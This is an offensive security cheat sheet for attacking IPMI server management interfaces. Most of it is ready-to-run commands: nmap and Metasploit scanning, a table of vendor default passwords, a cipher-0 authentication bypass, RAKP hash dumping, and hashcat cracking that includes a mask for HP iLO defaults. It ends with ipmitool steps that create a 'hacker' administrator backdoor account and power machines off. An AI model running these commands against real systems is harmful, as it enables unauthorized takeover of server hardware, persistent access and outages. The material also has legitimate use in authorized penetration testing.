# IPMI
```table-of-contents
```
## Discovery & Version
```shell
# Nmap - Version Detection
# -sU: UDP Scan (Required)
sudo nmap -sU -p 623 --script ipmi-version <IP>

# Metasploit - Version Scanner
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <IP>
run
```
## Default Credentials
| **Product**      | **Username**      | **Password**                          |
| ------------ | ------------- | --------------------------------- |
| `Dell iDRAC` | root          | calvin                            |
| `HP iLO`     | Administrator | _Random 8-char string (A-Z, 0-9)_ |
| `Supermicro` | ADMIN         | ADMIN                             |
| `Generic`    | admin         | admin                             |
| `Generic`    | root          | root                              |
## Vulnerability: Cipher 0 (Auth Bypass)
```shell
# Metasploit Check
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS <IP>
run

# Manual Check (ipmitool)
# If successful, you can list users without a password
ipmitool -I lanplus -C 0 -H <IP> -U admin -P "" user list
```
## Vulnerability: Hash Dumping (RAKP)
### 1. Dump Hashes
```shell
# Metasploit (Best method)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <IP>
run

# Script output format:
# <User>:<Hash>...
```
### 2. Crack Hashes (Hashcat)
```shell
# Generic Cracking
hashcat -m 7300 ipmi_hashes.txt rockyou.txt

# HP iLO Default Password Attack (Mask Attack)
# HP defaults are 8 chars, uppercase + numbers.
hashcat -m 7300 ipmi_hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
## Manual Interaction (ipmitool)
```shell
# Connect syntax
# -I lanplus: Interface | -H: Host | -U: User | -P: Pass
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> <COMMAND>

# 1. Check Status
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> chassis status

# 2. List Users
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user list

# 3. Create a Backdoor User
# Create user 'hacker' with password 'Password123!'
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user set name 2 hacker
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user set password 2 Password123!
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> user enable 2
# Grant Administrator privileges (Level 4)
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> channel setaccess 1 2 callin=on ipmi=on link=on privilege=4

# 4. Power Control (Dangerous!)
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> chassis power off
ipmitool -I lanplus -H <IP> -U <USER> -P <PASS> chassis power on
```